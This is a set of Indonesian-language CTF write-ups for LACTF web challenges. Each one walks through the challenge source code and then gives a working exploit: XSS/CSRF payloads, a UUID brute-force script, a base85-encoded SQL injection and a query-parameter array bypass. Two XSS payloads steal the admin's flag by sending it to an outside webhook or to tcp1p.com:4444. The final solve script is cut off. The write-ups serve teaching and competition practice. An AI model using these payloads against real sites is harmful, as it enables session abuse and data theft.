# Web
---
## metaverse - web
---
### Description
Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

metaverse.lac.tf

You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!

### TL;DR
Di challenge ini kita harus mendapatkan admin `displayName` dengan cara berteman dengan admin. Ini bisa kita lakukan dengan menggunakan teknik XSS dan CSRF, sehingga nantinya kita dapat memaksa admin berteman dengan akun kita.

### How to solve
#### Recon
Pada challenge ini kita diberikan link web challenge dan link bot. Kita juga diberikan source code dari challenge ini berupa `index.js` sebagai berikut:

```javascript=
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const { v4: uuid } = require("uuid");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
const posts = new Map();

const app = express();

let cleanup = [];

// clean up?
setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex((x) => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j++) {
        const account = accounts.get(cleanup[i][0]);
        for (const post of account.posts) {
            posts.delete(post);
        }
        accounts.delete(cleanup[i][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

function needsAuth(req, res, next) {
    if (!res.locals.user) {
        res.redirect("/login");
    } else {
        next();
    }
}

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.locals.user = null;
    if (req.cookies.login) {
        const chunks = req.cookies.login.split(":");
        if (chunks.length === 2 && accounts.has(chunks[0]) && accounts.get(chunks[0]).password === chunks[1]) {
            res.locals.user = chunks[0];
        }
    }
    next();
});

// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});

app.get("/", needsAuth);
app.get("/login", (req, res, next) => {
    if (res.locals.user) {
        res.redirect("/");
    } else {
        next();
    }
});
app.use(express.static(path.join(__dirname, "static"), { extensions: ["html"] }));

app.post("/register", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string" || typeof req.body.displayName !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    const displayName = req.body.displayName.trim();
    if (!/^[\w]{3,32}$/.test(username) || !/^[-\w !@#$%^&*()+]{3,32}$/.test(password) || !/^[-\w ]{3,64}/.test(displayName)) {
        res.redirect("/login#" + encodeURIComponent("Invalid metavalues provided for metafields."));
        return;
    }
    if (accounts.has(username)) {
        res.redirect("/login#" + encodeURIComponent("Metaaccount already metaexists."));
        return;
    }
    accounts.set(username, { password, displayName, posts: [], friends: [] });
    cleanup.push([username, Date.now() + 1000 * 60 * 60 * 12]);
    res.cookie("login", `${username}:${password}`, { httpOnly: true });
    res.redirect("/");
});

app.post("/login", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    if (accounts.has(username) && accounts.get(username).password === password) {
        res.cookie("login", `${username}:${password}`, { httpOnly: true });
        res.redirect("/");
    } else {
        res.redirect("/login#" + encodeURIComponent("Wrong metausername/metapassword."));
    }
});

app.post("/friend", needsAuth, (req, res) => {
    res.type("text/plain");
    const username = req.body.username.trim();
    if (!accounts.has(username)) {
        res.status(400).send("Metauser doesn't metaexist");
    } else {
        const user = accounts.get(username);
        if (user.friends.includes(res.locals.user)) {
            res.status(400).send("Already metafriended");
        } else {
            user.friends.push(res.locals.user);
            res.status(200).send("ok");
        }
    }
});

app.post("/post", needsAuth, (req, res) => {
    res.type("text/plain");
    const id = uuid();
    const content = req.body.content;
    if (typeof content !== "string" || content.length > 1000 || content.length === 0) {
        res.status(400).send("Invalid metacontent");
    } else {
        const user = accounts.get(res.locals.user);
        posts.set(id, content);
        user.posts.push(id);
        res.send(id);
    }
});

app.get("/posts", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts.get(res.locals.user).posts.map((id) => {
                const content = posts.get(id);
                return {
                    id,
                    blurb: content.length < 50 ? content : content.slice(0, 50) + "...",
                };
            })
        )
    );
});

app.get("/friends", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts
                .get(res.locals.user)
                .friends.filter((username) => accounts.has(username))
                .map((username) => ({
                    username,
                    displayName: accounts.get(username).displayName,
                }))
        )
    );
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

Yang pertama kali perlu kita tahu yaitu flag berada di `displayName` admin:

```javascript=
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```

`displayName` dari admin bisa kita dapatkan dengan cara berteman dengan admin dengan melakukan post request ke `/friend`

```javascript=
app.post("/friend", needsAuth, (req, res) => {
    res.type("text/plain");
    const username = req.body.username.trim();
    if (!accounts.has(username)) {
        res.status(400).send("Metauser doesn't metaexist");
    } else {
        const user = accounts.get(username);
        if (user.friends.includes(res.locals.user)) {
            res.status(400).send("Already metafriended");
        } else {
            user.friends.push(res.locals.user);
            res.status(200).send("ok");
        }
    }
});
```

Dan nanti daftar `displayName` akan muncul di `/`:

![](https://i.imgur.com/Nb7kjcU.png)

#### Exploit

Untuk mengeksploit challenge ini kita bisa memanfaatkan XSS yang berada di `/post/:id` dimana di kode tersebut akan me-replace `$CONTENT` tanpa me-sanitizenya terlebih dahulu sehingga vulnerable dengan XSS.

```javascript=
// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});
```

Kita bisa memanfaatkan XSS ini dengan cara membuat `metapost` baru dan menggunakan payload di bawah untuk melakukan post request ke `/friend` dan memaksa admin utuk berteman dengan `username` yaitu akun kita.

![](https://i.imgur.com/WPsox7J.png)

payload:

```htmlbars=
<script>
    const username = "asd"
    fetch("/friend", {
        method: "POST",
        mode:"no-cors",
        headers:{
            "Content-Type":"application/x-www-form-urlencoded"
        },
        body:"username="+username,
    })
</script>
```

Kita post dan kita akan mendapatkan link ke post tersebut, example:
```
https://metaverse.lac.tf/post/4c92e335-e93a-4662-beb8-e2ea478167dc
```

Ini kita kirim ke bot admin untuk men-trigger XSS pada akun admin, dan jangan lupa untuk berteman ke admin juga agar kita mendapatkan flagnya.

![](https://i.imgur.com/tmn8rQn.png)

## uuid hell - web

### Description

UUIDs are the best! I love them (if you couldn't tell)!

Site: uuid-hell.lac.tf

### How to solve
#### TL;DR
Di challenge ini kita perlu untuk mendapatkan UUID dari salah satu admin dan menggunakannya sebagai cookie untuk mendapatkan flag dari server. Kita hanya diberikan hash admin oleh server, tetapi karena UUID admin tidak begitu random, kita bisa menggunakan teknik bruteforce dan mengurangi waktu bruteforce dengan menggunakan `Date` dari server.

#### Recon
pada challenge ini kita diberikan url dan juga source code dari challenge tersebut:

```javascript
const uuid = require('uuid');
const crypto = require('crypto')

function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}

let adminuuids = []
let useruuids = []
function isAdmin(uuid) {
    return adminuuids.includes(uuid);
}
function isUuid(uuid) {
    if (uuid.length != 36) {
        return false;
    }
    for (const c of uuid) {
        if (!/[-a-f0-9]/.test(c)) {
            return false;
        }
    }
    return true;
}

function getUsers() {
    let output = "<strong>Admin users:</strong>\n";
    adminuuids.forEach((adminuuid) => {
        const hash = crypto.createHash('md5').update("admin" + adminuuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    output += "<br><br><strong>Regular users:</strong>\n";
    useruuids.forEach((useruuid) => {
        const hash = crypto.createHash('md5').update(useruuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    return output;

}

const express = require('express');
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());



app.get('/', (req, res) => {
    let id = req.cookies['id'];
    if (id === undefined || !isUuid(id)) {
        id = randomUUID();
        res.cookie("id", id);
        useruuids.push(id);
    } else if (isAdmin(id)) {
        res.send(process.env.FLAG);
        return;
    }

    res.send("You are logged in as " + id + "<br><br>" + getUsers());
});

app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});

app.listen(process.env.PORT);
```

Tampilan dari website challenge:

![](https://i.imgur.com/0EwlHWt.png)


Disini yang menarik adalah bagaimana `randomUUID` di generate:

```javascript=
function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}
```

Dia memakai `node` dan juga `clockseq`. Setelah trial & error ternyata hasil dari fungsi `randomUUID` tidak begitu random:

![](https://i.imgur.com/MVsidY8.png)

Dari gambar diatas bisa disimpulkan bahwa `radomUUID` tidak begitu random, hanya 4 byte pertama yang berubah dan perubahannya ini selalu bertambah, sehingga saya menyimpulkan bahwa ini mungkin dipengaruhi oleh waktu dari server.

Untuk melihat waktu dari server kita bisa melihat HTTP response header `Date` yang diberikan server menggunakan perintah `curl`:

```shell=
curl https://uuid-hell.lac.tf/ -v
```

output:

```
...snip...
< HTTP/2 200 
< date: Mon, 13 Feb 2023 00:45:31 GMT
< content-type: text/html; charset=utf-8
< x-powered-by: Express
< set-cookie: id=b7b9c6f0-ab37-11ed-aa64-67696e6b6f69; Path=/
< cf-cache-status: DYNAMIC
...snip...
```

Kurang lebih saya menggunakan kode seperti dibawah ini untuk mendapatkan UUID dari server, tetapi hasilnya sedikit berbeda, kemungkinan karena adanya delay dari server.

```javascript
const uuid = require('uuid');

function randomUUID() {
    return uuid.v1({
        'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69],
        'clockseq': 0b10101001100100,
        "msecs": Date.parse("Mon, 13 Feb 2023 00:45:31 GMT") ,
    });
}
console.log(randomUUID())
```

Ada juga yang menarik disini yaitu kita bisa membuat admin dan hashnya nanti akan terlihat di main page server.

```javascript
app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});
```

#### Exploit

Kita sudah tahu bahwa kita bisa membuat admin baru dan mendapatkan hashnya di web page challenge. Dari sini kita bisa membruteforce 4 byte pertama dari UUID, tetapi karna pasti akan lama untuk membruteforcenya kita perlu menggunakan `Date` dari server dan setelah itu kita bisa membruteforcenya agar sama dengan hash admin yang baru kita buat di `/createadmin`. Berikut script yang saya gunakan untuk membruteforce dan mendapatkan `Date` dari server:

```python
import hashlib
import requests
from subprocess import check_output
import re

URL = "https://uuid-hell.lac.tf"


def get_info(url=URL):
    class Info:
        date: str
        uuid: str
        hash: str

    res = requests.post(url+"/createadmin")
    info = Info
    info.date = res.headers.get("Date")
    res = requests.get(url)
    info.uuid = re.findall(r"(?<=as ).*?(?=<br>)", res.text)[-1]
    info.hash = re.findall(r"(?<=<tr><td>).*?(?=</td></tr>)", res.text)[49]
    return info


def compare_uuid(count, info=get_info()):
    script = """
    const uuid = require('uuid');
    const crypto = require('crypto')

    function randomUUID() {
        return uuid.v1({
            'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69],
            'clockseq': 0b10101001100100,
            "msecs": Date.parse("%s")+%d
        });
    }
    console.log(randomUUID())
    """ % (info.date, count)

    uuid = check_output(['node', '-e', script]).decode().strip()
    md5 = hashlib.md5()
    md5.update(("admin"+uuid).encode())
    if md5.hexdigest() == info.hash:
        print("admin uuid: "+uuid)
        return
    print(md5.hexdigest(), info.hash, uuid, info.uuid)
    compare_uuid(count+1)


compare_uuid(0)
```

Setelah dijalankan maka akan menghasilkan UUID admin seperti berikut:

![](https://i.imgur.com/dYD8Yaf.png)

Kita masukkan ke dalam cookie, dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/sWa4R1x.png)

## 85_reasons_why

### Description

If you wanna catch up on ALL the campus news, check out my new blog. It even has a reverse image search feature!

85-reasons-why.lac.tf

### How to solve
#### TL;DR

Challenge ini merupakan challenge SQL Injection dengan beberapat filter yaitu base85 dan juga unsecure custom escape. Di challenge ini kita perlu untuk mendapatkan post rahasia yang berisi flagnya. 

#### Recon

Di dalam source code yang diberikan ada fungsi yang menarik yaitu `serialize_image`, fungsi ini menerima intput berupa base85 dan setelah itu me sanitize quote dengan `re.sub`, kemungkinan ini tidak secure.

```python
def serialize_image(pp):
    b85 = base64.a85encode(pp)
    b85_string = b85.decode('UTF-8', 'ignore')

    # identify single quotes, and then escape them
    b85_string = re.sub('\\\\\\\\\\\\\'', '~', b85_string)
    b85_string = re.sub('\'', '\'\'', b85_string)
    b85_string = re.sub('~', '\'', b85_string)

    b85_string = re.sub('\\:', '~', b85_string)
    return b85_string
```

Setelah itu fungsi tersebut dipakai di `/image-search` dimana kalau kita lihat disitu ada vulnerability SQL Injection pada variable `a`

```python

@app.route('/image-search', methods=['GET', 'POST'])
def image_search():
    if 'image-query' not in request.files or request.method == 'GET':
        return render_template('image-search.html', results=[])

    incoming_file = request.files['image-query']
    size = os.fstat(incoming_file.fileno()).st_size
    if size > MAX_IMAGE_SIZE:
        flash("image is too large (50kb max)");
        return redirect(url_for('home'))

    spic = serialize_image(incoming_file.read())
    print(spic)

    try:
        a = "select parent as PID from images where b85_image = '{}' AND ((select active from posts where id=PID) = TRUE)".format(spic) # <- have sql injection 
        print(a)
        res = db.session.connection().execute(\
            text(a))
    except Exception:
        return ("SQL error encountered", 500)

    results = []
    for row in res:
        post = db.session.query(Post).get(row[0])
        if (post not in results):
            results.append(post)

    return render_template('image-search.html', results=results)
```

Disini seharusnya kita bisa melakukan SQLI, tetapi karena dia men-encode input kita menggunakan `base64.a85encode` kita harus mendecode payload kita terlebih dahulu menggunakan `base64.a85decode` dan kita harus berhati hati dengan padding dari base85 karna bisa membuat payload kita giberish dan menjadi tidak valid.

#### Exploit

Setelah trial dan error saya menemukan bypass untuk WAF tersebut, yaitu seperti berikut:

```python
a = base64.a85decode(b"""\\\\\\\\\\\\\\\\''/**/or/**/1--aa""")
print(a)
```

Sedikit penjelas dari payload diatas.
- `\\\\\\\\\\\\\\\\''` pada payload digunakan untuk membypass single quote
- `aa` digunakan untuk padding agar payload menghasilkan base85 yang valid dan tidak giberish.

Setelah itu kita bisa kirim hasil dari script diatas ke `/image-search` atau menggunakan script yang saya buat untuk mengirim payload tersebut.

```python 
import requests
import base64

# URL = "http://localhost:4444/"
URL = "https://85-reasons-why.lac.tf/"


def send_img(img, url=URL):
    res = requests.post(
        url+"image-search",
        files={"image-query": ('foo.jpeg', img, 'image/png')},
        # proxies={"https": "http://127.0.0.1:8080"},
        verify=False
    )
    return res.text

a = base64.a85decode(b"""\\\\\\\\\\\\\\\\''/**/or/**/1--aa""")
print(send_img(a))
b = base64.a85encode(a)
print(b)
```

Kita jalankan setelah itu kita akan mendapatkan flagnya di hidden post.

![](https://i.imgur.com/sTYkxQd.png)


## california-state-police - web
### Description

Stop! You're under arrest for making suggestive 3 letter acronyms!

california-state-police.lac.tf

Admin Bot (note: the adminpw cookie is HttpOnly and SameSite=Lax)

### How to solve

#### Recon

Di challenge ini kita diberikan source code sebagai berikut:

```javascript
const express = require("express");
const path = require("path");
const { v4: uuid } = require("uuid");
const cookieParser = require("cookie-parser");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const app = express();

const reports = new Map();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex(x => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j ++) {
        reports.delete(cleanup[j][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));

app.get("/flag", (req, res) => {
    res.status(400).send("you have to POST the flag this time >:)");
});

app.post("/flag", (req, res) => {
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(400).send("no hacking allowed");
    }
});

app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'none'; script-src 'unsafe-inline'"
    );
    next();
});

app.post("/report", (req, res) => {
    res.type("text/plain");
    const crime = req.body.crime;
    if (typeof crime !== "string") {
        res.status(400).send("no crime provided");
        return;
    }
    if (crime.length > 2048) {
        res.status(400).send("our servers aren't good enough to handle that");
        return;
    }
    const id = uuid();
    reports.set(id, crime);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.redirect("/report/" + id);
});

app.get("/report/:id", (req, res) => {
    if (reports.has(req.params.id)) {
        res.type("text/html").send(reports.get(req.params.id));
    } else {
        res.type("text/plain").status(400).send("report doesn't exist");
    }
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```
Kita dapat mendapatkan flagnya dengan melakukan post request ke page `/flag`, tetapi server akan mengekcek apakah kita memiliki cookie `adminpw` yang valid. Karna cookie `adminpw` dimiliki oleh admin bot hanya admin bot-lah yang bisa mengakses flag di page `/flag`

```javascript
app.post("/flag", (req, res) => {
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(400).send("no hacking allowed");
    }
});
```

Dilihat dari potongan kode sumber dibawah, `/report/:id` akan mengirimkan raw html response ke kita, dan ini bisa kita manfaatkan untuk melakukan XSS dan CSRF.

```javascript
app.get("/report/:id", (req, res) => {
    if (reports.has(req.params.id)) {
        res.type("text/html").send(reports.get(req.params.id));
...snip...
```

Tetapi kita melihat bahwa ada middle ware yang menambahkan header CSP pada setiap request yang masuk.

```javascript
app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'none'; script-src 'unsafe-inline'"
    );
    next();
});
```

Disini yang menarik adalah CSP `default-src 'none'`. CSP `default-src 'none'` akan menghalangi kita untuk mengakse page `/flag` sehingga kita tidak bisa melakukan CSRF dengan cara biasa.
> Untuk refrensi csp default-src bisa dilihat disini [default-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)

#### Exploit

CTF ini baru saya selesaikan saat LACTF sudah berakhir, saya tidak tahu bagaimana cara mengerjakannya, tetapi setelah bertanya di channel writeup saya diberikan referensi berikut

> https://lalitjc.wordpress.com/2013/05/03/2/

Saya juga diberikan contoh sebagai berikut.

```htmlbars
<form method="post" id="theForm" action="/flag" target='a'>
</form>
<script> 
    let w = window.open('','a');
    document.getElementById('theForm').submit();
    setTimeout(()=>{
        document.location= 'http://webhook?'+w.document.body.innerHTML
    },500);
</script>
```

Sedikit penjelasan dari payuload di atas. Payload di atas akan memunculkan window baru menggunakan `window.open` dia akan mengkaitkannya dengan `target=a` yang ada di `form` element, sehingga saat kita men-submit form tersebut menggunakan `document.getElementById('theForm').submit();` dia akan terkait dengan variable `w` dan kita akan bisa mengakse DOM dari page baru tersebut.

![](https://i.imgur.com/NTh8PTA.png)

Setelah itu kami menggunakan payload tersebut dan tidak lupa mengganti `document.location` ke webhook kami. Kita kirim url dari payload kita, dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/LNikobb.png)

## queue up! - web

### Description
I've put the flag on a web server, but due to high load, I've had to put a virtual queue in front of it. Just wait your turn patiently, ok? You'll get the flag eventually.

Disclaimer: Average wait time is 61 days.

Site: qu-flag.lac.tf

### How to solve

#### Recon
Pada challenge ini kita diberikan 2 server, yaitu server flag https://qu-flag.lac.tf/ dan server queue https://qu-queue.lac.tf/ . Kita juga diberikan source code.

Setelah me-review source code kita menemukan sesuatu yang menarik yang ada di `flagserver` yaitu:

`./flagserver/flagserver.js`
```javascript
// If post, check if uuid has finished the queue, and if so, show flag
app.post("/", async function (req, res) {
    let uuid;
    try {
        uuid = req.body.uuid;
    } catch {
        res.send("uuid?"+uuid);
        return;
    }

    if (uuid.length != 36) {
        res.send("len! "+uuid.length);
        return;
    }
    for (const c of uuid) {
        console.log(c)
        if (!/[-a-f0-9]/.test(c)) {
            res.send("did'n match"+uuid)
            return;
        }
    }
    const requestUrl = `http://queue:${process.env.QUEUE_SERVER_PORT}/api/${uuid}/status`;
    try {
        const result = await (await fetch(requestUrl, {
            headers: new Headers({
                'Authorization': 'Bearer ' + process.env.ADMIN_SECRET
            })
        })).text();
        if (result === "true") {
            console.log("Gave flag to UUID " + uuid);
            res.send(process.env.FLAG);
        } else {
            res.redirect(process.env.QUEUE_SERVER_URL);
        }
    } catch {
        res.redirect(process.env.QUEUE_SERVER_URL);
    }

});
```

Pada potongan source code diatas kita bisa meliahat bahwa server akan mengecek parameter `uuid` tapi disini dia tidak mengecek apakah parameter`uuid` yang kita masukkan merupakan `string` atau bukan, sehingga kisa bisa membuat parameter `uuid` sebagai array dan membypass check yang ada pada source code diatas.

Setelah itu kita bisa me rewrite `requestURL` dan membuatnnya mengakses `/api/:uuid/bypass` untuk membuat `uuid` user kita menjadi `server:true` agar kita bisa mendapatkan flagnya.

```javascript
    app.get("/api/:uuid/bypass", async (req, res) => {
        try {
            const user = await Queue.findByPk(req.params.uuid);
            if (user === undefined) {
                res.send("uuid not found");
            } else {
                await user.update({served: true});
                res.send("bypassed");
            }
        } catch {
            res.send("invalid uuid");
        }

    });
```

#### Exploitation

Untuk mengeksploitasi ini kita harus melakukan request ke `flagserver` yaitu https://qu-flag.lac.tf/ setelah itu kita mengirimkan request yang didalamnya ada 36 post request `uuid` sebagai berikut untuk membypass `uuid.length != 36` dan juga regex.

```shell
curl -X POST https://qu-flag.lac.tf/ -d "uuid=e7d9cd88-ecfb-45c2-bea1-e1727a25f8b8/bypass#&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f" -H "Content-Type: application/x-www-form-urlencoded"
```

di parameter uuid pertama kita harus menyelipkan tanda `#` agar sisa dari payloadnya diabaikan oleh server, kita juga perlu menambahkan `e7d9cd88-ecfb-45c2-bea1-e1727a25f8b8/bypass` untuk melakukan request ke `/api/:uuid/bypass` dan men-set `serve` dari uuid kita tersebut menjadi true.

Jalankan curl diatas dan kembali ke https://qu-flag.lac.tf/ maka kita akan mendapatka flagnya

![](https://i.imgur.com/9E3w9mv.png)


## hptia - web
### Description

I made a new hyper-productive todo list app that limits you to 12 characters per item so you can stop wasting time writing overly intricate todo lists!

Check it out here: hptla.lac.tf

Admin Bot (note: the adminpw cookie is HttpOnly and SameSite=Lax)

### How to solve

#### Recon

Pada challenge ini kita diberikan source code seperti berikut:

```javascript
const express = require("express");
const path = require("path");
const { v4: uuid } = require("uuid");
const cookieParser = require("cookie-parser");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const app = express();

const lists = new Map();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex(x => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j ++) {
        lists.delete(cleanup[j][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'"
    );
    next();
});
app.use(express.static(path.join(__dirname, "static")));

app.post("/list", (req, res) => {
    res.type("text/plain");
    const list = req.body.list;
    if (typeof list !== "string") {
        res.status(400).send("no list provided");
        return;
    }
    const parsed = list
        .trim()
        .split("\n")
        .map((x) => x.trim());
    if (parsed.length > 20) {v
        res.status(400).send("list must have at most 20 items");
        return;
    }
    if (parsed.some((x) => x.length > 12)) {
        res.status(400).send("list items must not exceed 12 characters");
        return;
    }
    const id = uuid();
    lists.set(id, parsed);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.send(id);
});

app.get("/list/:id", (req, res) => {
    res.type("application/json");
    if (lists.has(req.params.id)) {
        res.send(lists.get(req.params.id));
    } else {
        res.status(400).send({error: "list doesn't exist"});
    }
});

app.get("/flag", (req, res) => {
    res.type("text/plain");
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(401).send("haha no");
    }
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

Di client side kita juga menemukan file js yang menarik setelah melihat html pada `https://hptla.lac.tf/view.html` :

`https://hptla.lac.tf/view.js`
```javascript
const loading = document.getElementById("loading");
const error = document.getElementById("error");
const list = document.getElementById("list");
const id = location.hash.slice(1);
if (!/^[-0-9a-f]+$/.test(id)) {
    error.innerText = "invalid list id";
    error.classList.remove("hidden");
    loading.classList.add("hidden");
} else {
    (async function () {
        const res = await fetch("/list/" + id);
        try {
            const json = await res.json();
            if (res.status !== 200) {
                error.innerText = json.error;
                error.classList.remove("hidden");
            } else {
                list.innerHTML = json.map((x, i) => `<li><input type="checkbox" id="item${i}"><label for="item${i}">${x}</label></li>`).join("");
                list.classList.remove("hidden");
            }
            loading.classList.add("hidden");
        } catch (err) {
            error.innerText = "something went really wrong";
            error.classList.remove("hidden");
            loading.classList.add("hidden");
        }
    })();
}
```

Dari `view.js` kita dapat melihat hal yang menarik yaitu pada penggunaan `.innerHTML` yang tidak di sanitize terlebih dahulu sehingga ini bisa mengakibatkan serangan XSS.

```javascript
...snip...
                list.innerHTML = json.map((x, i) => `<li><input type="checkbox" id="item${i}"><label for="item${i}">${x}</label></li>`).join("");
...snip...
```

Tapi XSS ini tidak akan mudah karena kita diberi limit 12 huruf per-baris.

![](https://i.imgur.com/zDc1DAt.png)

Pada source code `index.js` kita juga bisa melihat bahwa ada restriksi lagi yaitu kita tidak dapat mengirim payload lebih dari 20 lines.

```javascript
...snip...
    if (parsed.length > 20) {v
        res.status(400).send("list must have at most 20 items");
        return;
    }
    if (parsed.some((x) => x.length > 12)) {
        res.status(400).send("list items must not exceed 12 characters");
        return;
    }
...snip...
```

Ketika kita mengirimkan payload berikut:

```
<script>
alert(1)
<script>
```

payload kita yang kita kirim akan berubah menjadi seperti gambar dibawah ini, sehingga kita tida dapat melakukan XSS degna benar.

![](https://i.imgur.com/TZ0Ml5A.png)


#### Exploit

Untuk ekploitasi soal ini kita bisa memakai comment syntax seperti berikut pada js `/*blablabla*/` sehingga nantinya tag seperti gambar diatas akan dianggap sebuah comment. 

Berikut payload akhir yang saya gunakan untuk mendaptkan XSS dan melakukan CSRF untuk mendapatkan flag yang berada di page `/flag` dan mengirimnya ke server kami.

```
<img src='
'onerror='/*
*/fetch(/*
*/"/flag")/*
*/.then(/*
*/(a)=>a./*
*/text()/*
*/.then(/*
*/(a)=>/*
*/location/*
*/.href=/*
*/"htt"+/*
*/"p:"+/*
*/"//tc"+/*
*/"p1p"+/*
*/".com"+/*
*/":44"+/*
*/"44?"+/*
*/a))/*
*/'>
```

Payload diatas akan menjadi seperti ini setelah kita submit:

![](https://i.imgur.com/xkHZu3m.png)

Ketikan kita ekstrak script pada `onerror` tersebut maka kita akan mendapatkan script js yang valid seperti dibawah ini, yang berarti XSS kita akan berjalan dengan benar.

```javascript
/*</label></li><li><input type="checkbox" id="item2"><label for="item2">*/fetch(/*</label></li><li><input type="checkbox" id="item3"><label for="item3">*/"/flag")/*</label></li><li><input type="checkbox" id="item4"><label for="item4">*/.then(/*</label></li><li><input type="checkbox" id="item5"><label for="item5">*/(a)=>a./*</label></li><li><input type="checkbox" id="item6"><label for="item6">*/text()/*</label></li><li><input type="checkbox" id="item7"><label for="item7">*/.then(/*</label></li><li><input type="checkbox" id="item8"><label for="item8">*/(a)=>/*</label></li><li><input type="checkbox" id="item9"><label for="item9">*/location/*</label></li><li><input type="checkbox" id="item10"><label for="item10">*/.href=/*</label></li><li><input type="checkbox" id="item11"><label for="item11">*/"htt"+/*</label></li><li><input type="checkbox" id="item12"><label for="item12">*/"p:"+/*</label></li><li><input type="checkbox" id="item13"><label for="item13">*/"//tc"+/*</label></li><li><input type="checkbox" id="item14"><label for="item14">*/"p1p"+/*</label></li><li><input type="checkbox" id="item15"><label for="item15">*/".com"+/*</label></li><li><input type="checkbox" id="item16"><label for="item16">*/":44"+/*</label></li><li><input type="checkbox" id="item17"><label for="item17">*/"44?"+/*</label></li><li><input type="checkbox" id="item18"><label for="item18">*/a))/*</label></li><li><input type="checkbox" id="item19"><label for="item19">*/
```

Sekarang kita kirim url hasil dari submit payload kita ke bot admin.

`example url that we goint to send to admin bot`
```
https://hptla.lac.tf/view.html#c5bf2790-ed14-43af-9b8c-80f28aba90c5
```

dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/hCMoG2a.png)

## Zero Trust - web

Zero truest solve script:

```python
from base64 import b64decode, b64encode
from urllib.parse import unquote
import requests

URL = "https://zero-trust.lac.tf/"


def xor(a, b):
    return bytes(aa ^ bb for aa, bb in zip(a, b))


def get_cookie(url=URL):
    res = requests.get(url)
    return res.cookies.get("auth")


